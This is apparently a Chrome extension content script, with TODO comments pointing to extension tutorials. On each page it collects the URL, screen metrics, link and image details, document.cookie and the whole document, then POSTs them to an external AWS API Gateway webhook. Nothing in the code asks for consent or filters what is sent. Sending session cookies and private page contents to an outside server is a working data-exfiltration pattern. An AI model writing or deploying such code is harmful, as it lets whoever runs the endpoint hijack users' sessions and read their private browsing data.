// TODO: auth into Portal
// TODO: https://thoughtbot.com/blog/how-to-make-a-chrome-extension
// https://developer.chrome.com/extensions/overview


const url = "https://4buo70od4m.execute-api.us-east-2.amazonaws.com/prod/webhook/chrome"

const w = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;

const h = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;

const links = [];
for (const link of document.links) {
    const l = {
        "href": link.href,
        "outer_text": link.outerText,
        "text": link.text
    }
    links.push(l)
}

const images = [];
for (const image of document.images) {
    const l = {
        "src": image.src,
        "alt": image.alt,
        "id": image.id,
        "className": image.className,
        "naturalWidth": image.naturalWidth,
        "naturalHeight": image.naturalHeight,
        "height": image.height,
        "width": image.width,
        "x": image.x,
        "y": image.y
    }
    images.push(l)
}

const data = {
    "window.location.href": window.location.href,
    "window.innerWidth": w,
    "window.innerHeight": h,
    "window.screen.width": window.screen.width,
    "window.screen.height": window.screen.height,
    "window.screen.availWidth": window.screen.availWidth,
    "window.screen.availHeight": window.screen.availHeight,
    "window.screen.colorDepth": window.screen.colorDepth,
    "window.screen.pixelDepth": window.screen.pixelDepth,
    "cookie": document.cookie,
    "content": document.documentElement,
    "document.url": URL,
    "document.title": document.title,
    "document.links": links,
    "document.images": images,
    "document.head": document.head,
    "document.body": document.body
}

$.ajax(url, {
    data : JSON.stringify(data),
    contentType : 'application/json',
    type : 'POST',
    success: function () {
        console.log('ack')
    }
});




